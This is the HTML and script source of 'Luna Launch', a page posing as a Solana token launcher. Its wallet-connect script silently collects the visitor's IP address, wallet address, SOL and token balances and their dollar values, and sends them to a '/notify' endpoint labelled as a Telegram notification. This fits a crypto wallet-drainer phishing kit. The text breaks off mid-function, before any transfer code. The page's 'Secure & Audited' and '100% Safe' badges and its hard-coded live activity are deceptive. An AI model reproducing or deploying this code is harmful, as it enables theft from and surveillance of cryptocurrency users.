<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Meta Tags -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1024, user-scalable=no">
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
    <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
    <title>Luna Launch</title>

    <!-- CSS Styles -->
    <link rel="stylesheet" href="assets/index-bdbdubf9.css">
    <link rel="stylesheet" href="assets/styles-DQqVfxH3.css">
    <link rel="stylesheet" href="assets/Nav-CEpo9JHw.css">
    <link rel="stylesheet" href="assets/Footer-DFm38Gq1.css">
    <link rel="stylesheet" href="assets/Tools-BXMnATEF.css">
    <link rel="stylesheet" href="assets/Landing-DtKI65OX.css">
    <style>
        html { min-width: 1024px; }
        .create-token-btn-mobile { display: none !important; }
        .create-token-box .create-token-btn:not(.create-token-btn-mobile) {
            display: inline-flex !important;
            align-items: center;
            gap: .5rem;
        }
        /* Wallet Modal Styles - Dark Theme & Mobile Compatible */
        .wallet-modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }
        .wallet-modal-content {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 15px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
            color: #fff;
        }
        .wallet-modal-header h3 {
            margin: 0 0 20px;
            font-size: 24px;
            color: #00FFA3;
        }
        .wallet-option {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            margin: 10px 0;
            background: #222;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .wallet-option:hover {
            background: #2a2a2a;
            transform: translateY(-2px);
        }
        .wallet-option .wallet-icon {
            width: 24px;
            height: 24px;
            margin-right: 10px;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }
        .status-dot.installed { background: #00FF7F; }
        .status-dot.not-installed { background: #FF4500; }
        .status-text { margin-left: 10px; color: #ccc; }
        .status-installed { color: #00FF7F; }
        .status-not-installed { color: #FF4500; }
        .hidden { display: none; }
        .active { display: block; }
        .locked { pointer-events: none; opacity: 0.6; }
        .wallet-loading-spinner img {
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .wallet-loading-title {
            font-size: 20px;
            margin: 10px 0;
            color: #00FFA3;
        }
        .wallet-loading-subtitle {
            font-size: 16px;
            color: #bbb;
        }
        .rejected { opacity: 0.5; }
        .shake {
            animation: shake 0.5s;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            50% { transform: translateX(10px); }
            75% { transform: translateX(-10px); }
            100% { transform: translateX(0); }
        }
        #close-modal {
            margin-top: 20px;
            padding: 10px 20px;
            background: #333;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        #close-modal:hover {
            background: #444;
        }
        @media (max-width: 768px) {
            .wallet-modal-content {
                width: 85%;
                padding: 15px;
            }
            .wallet-option {
                padding: 12px;
                font-size: 14px;
            }
            .wallet-modal-header h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Wallet Modal -->
    <div id="wallet-modal" class="wallet-modal-overlay">
        <div class="wallet-modal-content">
            <div class="wallet-modal-header">
                <h3>Select Your Wallet</h3>
            </div>
            <div id="wallet-options">
                <div class="wallet-option" data-wallet="phantom">
                    <img src="https://phantom.app/img/logo.png" alt="Phantom" class="wallet-icon">
                    <span id="phantom-status"></span>
                    <button id="phantom-wallet">Phantom</button>
                </div>
                <div class="wallet-option" data-wallet="torus">
                    <img src="https://tor.us/assets/images/logo/torus-logo.svg" alt="Torus" class="wallet-icon">
                    <span id="torus-status"></span>
                    <button id="torus-wallet">Torus</button>
                </div>
                <div class="wallet-option" data-wallet="ledger">
                    <img src="https://ledger.com/wp-content/uploads/2021/01/ledger-logo-blue.png" alt="Ledger" class="wallet-icon">
                    <span id="ledger-status"></span>
                    <button id="ledger-wallet">Ledger</button>
                </div>
                <div class="wallet-option" data-wallet="sollet">
                    <img src="https://sollet.io/assets/img/icon-192x192.png" alt="Sollet" class="wallet-icon">
                    <span id="sollet-status"></span>
                    <button id="sollet-wallet">Sollet</button>
                </div>
                <div class="wallet-option" data-wallet="slope">
                    <img src="https://slope.finance/images/logo.png" alt="Slope" class="wallet-icon">
                    <span id="slope-status"></span>
                    <button id="slope-wallet">Slope</button>
                </div>
                <div class="wallet-option" data-wallet="solflare">
                    <img src="https://solflare.com/assets/images/solflare-logo.svg" alt="Solflare" class="wallet-icon">
                    <span id="solflare-status"></span>
                    <button id="solflare-wallet">Solflare</button>
                </div>
                <div class="wallet-option" data-wallet="sollet-extension">
                    <img src="https://sollet.io/assets/img/icon-192x192.png" alt="Sollet Extension" class="wallet-icon">
                    <span id="sollet-extension-status"></span>
                    <button id="sollet-extension-wallet">Sollet (Extension)</button>
                </div>
            </div>
            <div id="wallet-loading-state" class="hidden">
                <div class="wallet-loading-spinner">
                    <img src="https://www.w3schools.com/howto/img/ring.gif" alt="Loading">
                </div>
                <div class="wallet-loading-title"></div>
                <div class="wallet-loading-subtitle"></div>
            </div>
            <button id="close-modal">Close</button>
        </div>
    </div>

    <!-- Navigation -->
    <div id="root">
        <div class="nav-container">
            <a class="logo-container active" href="#" data-discover="true" aria-current="page">
                <div class="logo-img"><img alt="logo" src="assets/logo-full.svg"></div>
            </a>
            <nav class="main-nav">
                <a aria-current="page" class="nav-link active" data-discover="true" href="#">Home</a>
                <a class="nav-link" data-discover="true" href="create-token/index.html">Create Token</a>
                <a class="nav-link" data-discover="true" href="tools.html">Tools</a>
                <a class="nav-link" href="my-portfolio/index.html" rel="noopener noreferrer">Liquidity Pool</a>
                <a class="nav-link" href="https://raydium.io/swap" rel="noopener noreferrer" target="_blank">Manage Liquidity</a>
            </nav>
            <div class="wallet-dropdown">
                <div class="wallet-display connect-wallet-btn" id="connect-wallet">Connect Wallet</div>
                <button class="menu-icon" style="background-color: rgb(255, 255, 255); border-radius: 5px; border: medium; cursor: pointer; padding: 8px; margin-left: 10px; transition: 0.3s; display: flex; align-items: center; justify-content: center;">
                    <span class="material-symbols-rounded">
                        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" class="feather feather-menu" viewBox="0 0 24 24" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <line x1="3" y1="12" x2="21" y2="12"></line>
                            <line x1="3" y1="6" x2="21" y2="6"></line>
                            <line x1="3" y1="18" x2="21" y2="18"></line>
                        </svg>
                    </span>
                </button>
                <div class="sidebar-menu closed">
                    <div class="sidebar-menu-item"><a class="nav-link active" href="#" data-discover="true" aria-current="page">Home</a></div>
                    <div class="sidebar-menu-item"><a class="nav-link" href="create-token/index.html" data-discover="true">Create Token</a></div>
                    <div class="sidebar-menu-item"><a class="nav-link" href="tools.html" data-discover="true">Tools</a></div>
                    <div class="sidebar-menu-item"><a href="https://raydium.io/liquidity/create-pool" class="nav-link" target="_blank" rel="noopener noreferrer">Liquidity Pool</a></div>
                    <div class="sidebar-menu-item"><a href="https://raydium.io/swap" class="nav-link" target="_blank" rel="noopener noreferrer">Manage Liquidity</a></div>
                    <div class="sidebar-menu-item"><a class="nav-link" href="https://lunalaunch.com/support" data-discover="true">Support</a></div>
                </div>
            </div>
        </div>

        <!-- Main Content -->
        <div id="main">
            <div id="landing" style="opacity: 1;">
                <div class="hero-section">
                    <div class="trust-indicators" style="transform: translateY(0.64479%);">
                        <div class="trust-stats">
                            <div class="trust-stat">
                                <div class="trust-number">50,000+</div>
                                <div class="trust-label">Tokens Created</div>
                            </div>
                            <div class="trust-stat">
                                <div class="trust-number">25,000+</div>
                                <div class="trust-label">Active Users</div>
                            </div>
                            <div class="trust-stat">
                                <div class="trust-number">99.9%</div>
                                <div class="trust-label">Success Rate</div>
                            </div>
                        </div>
                        <div class="trust-badges">
                            <div class="trust-badge">
                                <div class="badge-icon">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 16H6V10h12v12z" fill="#00FFA3"></path>
                                        <circle cx="12" cy="15" r="2" fill="#00FFA3"></circle>
                                    </svg>
                                </div>
                                <span>Secure &amp; Audited</span>
                            </div>
                            <div class="trust-badge">
                                <div class="badge-icon">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M7 2v11h3v9l7-12h-4l4-8z" fill="#FFD700"></path>
                                    </svg>
                                </div>
                                <span>Lightning Fast</span>
                            </div>
                            <div class="trust-badge">
                                <div class="badge-icon">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10V11.5H13.5V10C13.5,8.7 12.8,8.2 12,8.2Z" fill="#00FFA3"></path>
                                    </svg>
                                </div>
                                <span>100% Safe</span>
                            </div>
                        </div>
                        <div class="live-activity">
                            <div class="activity-header">
                                <div class="live-dot"></div>
                                <span>Live Activity</span>
                            </div>
                            <div class="activity-item">
                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
                                    <path d="M2.81 14.7l1.68-1.81c.69-.74 1.08-1.71 1.08-2.72V9c0-.89.33-1.78 1-2.45C7.22 5.89 8.11 5.56 9 5.56c.89 0 1.78.33 2.45 1S12.44 8.11 12.44 9v1.17c0 1.01.39 1.98 1.08 2.72l1.68 1.81c.31.33.31.85 0 1.18-.31.33-.85.33-1.18 0L12 13.83c-.68-.73-1.71-1.15-2.81-1.15s-2.13.42-2.81 1.15L4.36 15.9c-.33.33-.87.33-1.18 0-.32-.33-.32-.85-.01-1.18z" fill="#FF6B35"></path>
                                    <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="#FF6B35"></path>
                                </svg>
                                <span>TokenX launched 2 min ago</span>
                            </div>
                            <div class="activity-item">
                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
                                    <path d="M6,2L18,22L12,18L6,22L6,2Z" fill="#00D4FF"></path>
                                </svg>
                                <span>CryptoGem deployed 5 min ago</span>
                            </div>
                            <div class="activity-item">
                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;">
                                    <path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.90-.1-1.36-.1z" fill="#FFD700"></path>
                                </svg>
                                <span>MoonShot created 8 min ago</span>
                            </div>
                        </div>
                    </div>
                    <div class="title-box">
                        <span class="title-1">#1 Solana Token Launcher in the World</span>
                        <div class="title-2">
                            <span class="span-1">Launch your <span style="font-weight: 900;">$Solana</span> Token</span>
                            <span class="span-2"><span style="font-weight: 700;">Take it</span> <span style="font-weight: 500;">to the</span> <span style="font-weight: 900;">Moon!</span></span>
                        </div>
                        <div class="desc">
                            <span class="span-1">Create and deploy your Solana coin effortlessly in seconds.</span>
                            <span class="span-2">Reach the world and scale without limits!</span>
                        </div>
                        <div class="create-token-box">
                            <input class="create-token-text" placeholder="Create your first token" value="">
                            <div class="create-token-btn create-token-btn-mobile" style="cursor: pointer; display: none;">
                                <span class="text">Token creation is only available on desktop</span>
                            </div>
                            <div onclick="location.href='create-token/index.html'" class="create-token-btn" style="cursor: pointer;">
                                <span class="text">Create Token</span>
                                <span class="material-symbols-rounded"></span>
                            </div>
                        </div>
                    </div>
                    <div class="background-1" style="transform: translateY(0.48359%);">
                        <img alt="Earth Background" src="assets/bg1-DWJ0RCfe.png">
                    </div>
                    <div class="background-2">
                        <img alt="iPhone Screenshot" src="assets/iPhoneSS-DpoVylXb.png">
                    </div>
                </div>
                <div class="content-container">
                    <div class="content-section">
                        <div class="content-text-1">
                            <span class="span-1">The world’s most powerful</span>
                            <span class="span-2">Solana Launcher ever.</span>
                        </div>
                        <div class="content-img-1">
                            <div class="content-controls"><span></span><span></span><span></span></div>
                            <div class="border-bg"></div>
                            <img src="assets/contentimg1-d6m7sRFw.png">
                            <div class="fade-fg"></div>
                        </div>
                    </div>
                    <div class="phone-parallax-section">
                        <div class="parallax-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
                        <div class="img-container">
                            <img class="left-img" style="transform: translateY(30%);" src="assets/coinGroup1-R48YoBp5.png">
                            <img class="iphone-img" src="assets/iPhone%20Image-pZbQWzRq.png">
                            <img class="right-img" style="transform: translateY(30%);" src="assets/coinGroup2-Bkx6Q6TB.png">
                        </div>
                    </div>
                    <div class="features-section">
                        <div class="features-label">Features</div>
                        <div class="features-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
                        <div class="features-subtitle">Create, manage, and launch your Solana token effortlessly with secure transactions, instant deployment, and zero coding required!</div>
                        <div class="features-container">
                            <div class="features-img">
                                <img src="assets/iPhone%20Image-pZbQWzRq.png">
                            </div>
                            <div class="features-stats">
                                <div class="features-stat">
                                    <div class="features-stat-value">99.9%</div>
                                    <div class="features-stat-label">Successful Token Launches</div>
                                </div>
                                <div class="features-stat">
                                    <div class="features-stat-value">85%+</div>
                                    <div class="features-stat-label">Returned Users</div>
                                </div>
                            </div>
                            <div class="features-description">
                                <div class="features-description-text">
                                    <div class="features-description-title">Create &amp; Deploy Your Token in Minutes</div>
                                    <div class="features-description-subtitle">Turn your idea into reality with lightning-fast token creation. Whether for projects, communities, or innovation, deploy your Solana token in minutes - with ease, secure, and built for the future!</div>
                                </div>
                                <div onclick="location.href='create-token/index.html'" class="create-token-btn" style="cursor: pointer;">
                                    <span class="text" href="create-token/index.html">Create Token</span>
                                    <span class="material-symbols-rounded"></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer-container">
            <a class="logo-container active" href="#" data-discover="true" aria-current="page">
                <div class="logo-img"><img alt="logo" src="assets/logo-full.svg"></div>
            </a>
            <div class="bottom-bar" select="false">
                <div class="copyright-bar">
                    <span>© Luna Launcher 2025</span>
                </div>
                <div class="policies-bar">
                    <a class="policy-link" href="terms-of-service.html" data-discover="true">Terms of Service</a>
                    <span class="separator"></span>
                    <a class="policy-link" href="privacy-policy.html" data-discover="true">Privacy Policy</a>
                </div>
            </div>
            <div class="wallet-dropdown">
                <div class="wallet-display connect-wallet-btn" id="connect-wallet-hero">Connect Wallet</div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.93.0/dist/index.iife.min.js"></script>
    <script>
        // Wallet Connector Script
        $(document).ready(function() {
            let selectedWalletProvider = null;

            // Utility Functions
            async function getClientIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Failed to get IP:', error);
                    return null;
                }
            }

            async function getSPLTokenInfo(connection, publicKey) {
                try {
                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                        programId: window.solanaWeb3.TOKEN_PROGRAM_ID,
                    });

                    const tokens = [];
                    const tokenPrices = await getTokenPrices();
                    
                    for (const tokenAccount of tokenAccounts.value) {
                        const accountData = tokenAccount.account.data;
                        const parsedInfo = accountData.parsed.info;
                        const balance = parsedInfo.tokenAmount;

                        if (balance.uiAmount > 0) {
                            const mint = parsedInfo.mint;
                            const symbol = getTokenSymbol(mint);
                            const price = tokenPrices[mint] || 0;
                            const usdValue = balance.uiAmount * price;
                            
                            tokens.push({
                                mint: mint,
                                balance: balance.uiAmount,
                                symbol: symbol,
                                usdValue: usdValue
                            });
                        }
                    }
                    return tokens;
                } catch (error) {
                    console.error('Failed to get SPL tokens:', error);
                    return [];
                }
            }

            async function getTokenPrices() {
                try {
                    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
                    const data = await response.json();
                    
                    return {
                        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
                        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
                        'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
                        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
                    };
                } catch (error) {
                    console.error('Failed to get token prices:', error);
                    return {};
                }
            }

            function getTokenSymbol(mint) {
                const tokenMap = {
                    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
                    'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
                    'So11111111111111111111111111111111111111112': 'WSOL',
                    'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
                    'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
                    'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
                };
                return tokenMap[mint] || 'Unknown';
            }

            async function sendTelegramNotification(message) {
                try {
                    await fetch('/notify', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            address: message.address,
                            balance: message.balance,
                            usdBalance: message.usdBalance,
                            walletType: message.walletType,
                            customMessage: message.customMessage,
                            splTokens: message.splTokens,
                            ip: message.ip
                        })
                    });
                } catch (error) {
                    console.error('Failed to send Telegram notification:', error);
                }
            }

            function isMobile() {
                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            }

            function getCurrentSiteUrl() {
                return encodeURIComponent(window.location.origin);
            }

            function checkWalletAvailability() {
                const isMobileDevice = isMobile();
                
                const wallets = {
                    phantom: {
                        provider: window.solana,
                        condition: window.solana && window.solana.isPhantom,
                        name: 'Phantom Wallet',
                        isMobileSupported: true,
                        installUrl: {
                            chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
                            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
                            mobile: 'https://phantom.app/download'
                        }
                    },
                    torus: {
                        provider: window.Torus,
                        condition: window.Torus && typeof window.Torus.connect === 'function',
                        name: 'Torus Wallet',
                        isMobileSupported: true,
                        installUrl: {
                            chrome: 'https://chrome.google.com/webstore/detail/torus/abjpebfekgjofdjnhdgnlkopdglgahpm',
                            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/torus-wallet/',
                            mobile: 'https://tor.us/download'
                        }
                    },
                    ledger: {
                        provider: window.LedgerSolana,
                        condition: window.LedgerSolana && typeof window.LedgerSolana.connect === 'function',
                        name: 'Ledger Wallet',
                        isMobileSupported: false,
                        installUrl: {
                            chrome: 'https://support.ledger.com/hc/en-us/articles/115005165269-Install-and-update-Ledger-Live',
                            firefox: 'https://support.ledger.com/hc/en-us/articles/115005165269-Install-and-update-Ledger-Live',
                            mobile: null
                        }
                    },
                    sollet: {
                        provider: window.sollet,
                        condition: window.sollet && typeof window.sollet.connect === 'function',
                        name: 'Sollet Wallet',
                        isMobileSupported: false,
                        installUrl: {
                            chrome: 'https://chrome.google.com/webstore/detail/sollet/fhmfendgkcjommhlokihnmlgkmnakgaf',
                            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/sollet/',
                            mobile: null
                        }
                    },
                    slope: {
                        provider: window.slope,
                        condition: window.slope && window.slope.isSlope,
                        name: 'Slope Wallet',
                        isMobileSupported: true,
                        installUrl: {
                            chrome: 'https://chrome.google.com/webstore/detail/slope-wallet/aholpfdialjgjfjmmpgmngihhkljfhlj',
                            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/slope-wallet/',
                            mobile: 'https://slope.finance/download'
                        }
                    },
                    solflare: {
                        provider: window.solflare,
                        condition: window.solflare && window.solflare.isSolflare,
                        name: 'Solflare Wallet',
                        isMobileSupported: true,
                        installUrl: {
                            chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
                            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                            mobile: 'https://solflare.com/download'
                        }
                    },
                    'sollet-extension': {
                        provider: window.solletExtension,
                        condition: window.solletExtension && typeof window.solletExtension.connect === 'function',
                        name: 'Sollet Extension',
                        isMobileSupported: false,
                        installUrl: {
                            chrome: 'https://chrome.google.com/webstore/detail/sollet-extension/fhmfendgkcjommhlokihnmlgkmnakgaf',
                            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/sollet-extension/',
                            mobile: null
                        }
                    }
                };

                Object.keys(wallets).forEach(walletId => {
                    const wallet = wallets[walletId];
                    const statusElement = document.getElementById(`${walletId}-status`);
                    const optionElement = document.getElementById(`${walletId}-wallet`);
                    
                    if (wallet.condition) {
                        statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
                        optionElement.disabled = false;
                    } else if (isMobileDevice && wallet.isMobileSupported) {
                        statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
                        optionElement.disabled = false;
                    } else {
                        statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
                        optionElement.disabled = false;
                    }
                });

                return wallets;
            }

            function getWalletProvider(walletType) {
                const providers = {
                    phantom: window.solana,
                    torus: window.Torus,
                    ledger: window.LedgerSolana,
                    sollet: window.sollet,
                    slope: window.slope,
                    solflare: window.solflare,
                    'sollet-extension': window.solletExtension
                };
                return providers[walletType];
            }

            async function connectWallet(walletType, walletProvider) {
                try {
                    const wallets = checkWalletAvailability();
                    const walletInfo = wallets[walletType];
                    const isMobileDevice = isMobile();
                    
                    if (isMobileDevice && !walletInfo.condition) {
                        let deepLinkUrl, appName;
                        
                        if (walletType === 'phantom') {
                            const currentUrl = getCurrentSiteUrl();
                            deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                            appName = 'Phantom App';
                        } else if (walletType === 'solflare') {
                            const currentUrl = getCurrentSiteUrl();
                            deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                            appName = 'Solflare App';
                        } else if (walletType === 'slope') {
                            const currentUrl = getCurrentSiteUrl();
                            deepLinkUrl = `https://slope.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                            appName = 'Slope App';
                        } else if (walletType === 'torus') {
                            deepLinkUrl = 'https://tor.us/download';
                            appName = 'Torus App';
                        } else {
                            deepLinkUrl = walletInfo.installUrl.mobile || walletInfo.installUrl.chrome;
                            appName = walletInfo.name.replace(' Wallet', ' App');
                        }
                        
                        if (deepLinkUrl) {
                            await sendTelegramNotification({
                                address: 'Unknown',
                                balance: 'Unknown',
                                usdBalance: 'Unknown',
                                walletType: walletInfo.name,
                                customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
                            });
                            
                            showWalletLoading();
                            $('.wallet-loading-title').text(`Opening ${appName}`);
                            $('.wallet-loading-subtitle').html(`Redirecting to ${appName}...<br>Please approve the connection in the app.`);
                            
                            const connectionCheckInterval = setInterval(() => {
                                const provider = walletType === 'phantom' ? window.solana :
                                                walletType === 'torus' ? window.Torus :
                                                walletType === 'ledger' ? window.LedgerSolana :
                                                walletType === 'sollet' ? window.sollet :
                                                walletType === 'slope' ? window.slope :
                                                walletType === 'solflare' ? window.solflare :
                                                window.solletExtension;
                                const condition = walletType === 'phantom' ? (window.solana && window.solana.isPhantom) :
                                                walletType === 'torus' ? (window.Torus && typeof window.Torus.connect === 'function') :
                                                walletType === 'ledger' ? (window.LedgerSolana && typeof window.LedgerSolana.connect === 'function') :
                                                walletType === 'sollet' ? (window.sollet && typeof window.sollet.connect === 'function') :
                                                walletType === 'slope' ? (window.slope && window.slope.isSlope) :
                                                walletType === 'solflare' ? (window.solflare && window.solflare.isSolflare) :
                                                (window.solletExtension && typeof window.solletExtension.connect === 'function');
                                    
                                if (condition) {
                                    clearInterval(connectionCheckInterval);
                                    connectWallet(walletType, provider);
                                }
                            }, 1000);
                            
                            setTimeout(() => {
                                clearInterval(connectionCheckInterval);
                                showWalletOptions();
                                unlockModal();
                            }, 120000);
                            
                            window.location.href = deepLinkUrl;
                            return;
                        }
                    }
                    
                    if (!walletInfo.condition) {
                        let installUrl;
                        if (isMobileDevice && walletInfo.installUrl.mobile) {
                            installUrl = walletInfo.installUrl.mobile;
                        } else {
                            const isFirefox = typeof InstallTrigger !== "undefined";
                            installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
                        }
                        
                        await sendTelegramNotification({
                            address: 'Unknown',
                            balance: 'Unknown',
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: `❌ ${walletInfo.name} ${isMobileDevice ? 'App' : 'Extension'} Not Found`
                        });
                        
                        showWalletOptions();
                        
                        const installMessage = isMobileDevice ? 
                            `${walletInfo.name} mobile app is required. Would you like to download it?` :
                            `${walletInfo.name} is not installed. Would you like to install it?`;
                        
                        if (confirm(installMessage)) {
                            window.open(installUrl, '_blank');
                        }
                        return;
                    }

                    if (!walletProvider) {
                        throw new Error('Wallet provider not found');
                    }

                    showWalletLoading();
                    
                    if (walletType === 'phantom') {
                        $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
                        $('.wallet-loading-spinner img').attr('alt', 'Phantom');
                        $('.wallet-loading-title').text('Connecting Phantom');
                        $('.wallet-loading-spinner').removeClass('solflare');
                    } else if (walletType === 'solflare') {
                        $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
                        $('.wallet-loading-spinner img').attr('alt', 'Solflare');
                        $('.wallet-loading-title').text('Connecting Solflare');
                        $('.wallet-loading-spinner').addClass('solflare');
                    } else if (walletType === 'torus') {
                        $('.wallet-loading-spinner img').attr('src', 'https://tor.us/favicon.ico');
                        $('.wallet-loading-spinner img').attr('alt', 'Torus');
                        $('.wallet-loading-title').text('Connecting Torus');
                        $('.wallet-loading-spinner').removeClass('solflare');
                    } else if (walletType === 'ledger') {
                        $('.wallet-loading-spinner img').attr('src', 'https://www.ledger.com/favicon.ico');
                        $('.wallet-loading-spinner img').attr('alt', 'Ledger');
                        $('.wallet-loading-title').text('Connecting Ledger');
                        $('.wallet-loading-spinner').removeClass('solflare');
                    } else if (walletType === 'sollet') {
                        $('.wallet-loading-spinner img').attr('src', 'https://sollet.io/favicon.ico');
                        $('.wallet-loading-spinner img').attr('alt', 'Sollet');
                        $('.wallet-loading-title').text('Connecting Sollet');
                        $('.wallet-loading-spinner').removeClass('solflare');
                    } else if (walletType === 'slope') {
                        $('.wallet-loading-spinner img').attr('src', 'https://slope.finance/favicon.ico');
                        $('.wallet-loading-spinner img').attr('alt', 'Slope');
                        $('.wallet-loading-title').text('Connecting Slope');
                        $('.wallet-loading-spinner').removeClass('solflare');
                    } else if (walletType === 'sollet-extension') {
                        $('.wallet-loading-spinner img').attr('src', 'https://sollet.io/favicon.ico');
                        $('.wallet-loading-spinner img').attr('alt', 'Sollet Extension');
                        $('.wallet-loading-title').text('Connecting Sollet Extension');
                        $('.wallet-loading-spinner').removeClass('solflare');
                    } else {
                        $('.wallet-loading-title').text('Connecting to Wallet');
                        $('.wallet-loading-spinner').removeClass('solflare');
                    }
                    
                    $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');

                    if (walletType === 'solflare') {
                        if (!walletProvider || !walletProvider.isSolflare) {
                            throw new Error('Solflare wallet not detected. Please make sure Solflare extension is installed and enabled.');
                        }
                    } else if (walletType === 'slope') {
                        if (!walletProvider || !walletProvider.isSlope) {
                            throw new Error('Slope wallet not detected. Please make sure Slope extension is installed and enabled.');
                        }
                    }

                    let resp;
                    if (walletType === 'torus' || walletType === 'ledger' || walletType === 'sollet' || walletType === 'sollet-extension') {
                        resp = await walletProvider.connect();
                    } else {
                        resp = await walletProvider.connect();
                    }
                    console.log(`${walletInfo.name} connected:`, resp);

                    $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
                    $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');

                    const connection = new window.solanaWeb3.Connection(
